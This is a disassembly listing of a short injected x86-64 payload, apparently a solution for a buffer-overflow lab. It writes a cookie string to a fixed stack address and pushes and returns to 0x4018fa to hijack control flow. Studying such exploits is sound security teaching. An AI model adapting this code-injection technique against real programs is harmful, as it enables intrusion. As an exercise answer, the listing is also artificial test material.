
instructions.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 bf 00 f7 fe f7 ff 	movabs $0x7ffff7fef700,%rdi
   7:	7f 00 00 
   a:	c6 47 08 00          	movb   $0x0,0x8(%rdi)
   e:	48 b8 35 39 62 39 39 	movabs $0x6166373939623935,%rax
  15:	37 66 61 
  18:	48 89 07             	mov    %rax,(%rdi)
  1b:	68 fa 18 40 00       	pushq  $0x4018fa
  20:	c3                   	retq   
